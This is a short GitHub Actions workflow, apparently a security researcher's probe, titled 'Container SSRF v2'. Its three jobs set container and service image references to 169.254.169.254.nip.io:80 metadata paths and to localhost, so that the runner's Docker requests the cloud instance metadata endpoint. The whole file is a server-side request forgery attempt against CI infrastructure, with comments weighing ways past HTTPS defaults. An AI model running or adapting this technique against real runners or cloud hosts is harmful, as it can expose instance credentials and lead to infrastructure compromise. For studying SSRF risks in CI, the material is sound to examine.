name: Container SSRF v2
on: workflow_dispatch
jobs:
  # Test 1: container key with port 80 (BuildKit HTTP fallback?)
  container-test:
    runs-on: ubuntu-latest
    container:
      image: 169.254.169.254.nip.io:80/metadata/instance
    steps:
      - run: echo "If you see this, the container started"

  # Test 2: services key with port 80
  services-test:
    runs-on: ubuntu-latest
    services:
      metadata-svc:
        image: 169.254.169.254.nip.io:80/latest/meta-data
    steps:
      - run: echo "Service test"

  # Test 3: What about .nip.io without port?
  # Docker defaults to HTTPS, which times out on metadata
  # But can we use a hostname that Docker treats as local?
  local-test:
    runs-on: ubuntu-latest
    container:
      image: localhost:80/test
    steps:
      - run: echo "localhost test"
